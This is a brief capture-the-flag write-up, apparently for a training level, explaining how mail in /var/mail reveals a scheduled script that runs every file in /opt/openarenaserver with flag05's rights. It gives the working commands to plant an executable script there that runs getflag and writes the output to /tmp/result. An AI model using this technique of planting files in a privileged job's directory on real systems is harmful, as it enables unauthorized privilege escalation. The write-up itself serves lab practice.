There is mail in /var/mail that points to script

This script run all files in directory with rights of flag05 rights
```
echo '#!/bin/bash
getflag > /tmp/result' > /opt/openarenaserver/ran.sh
```

add 
```
chmod +x /opt/openarenaserver/ran.sh
```
then
```
cat /tmp/result
```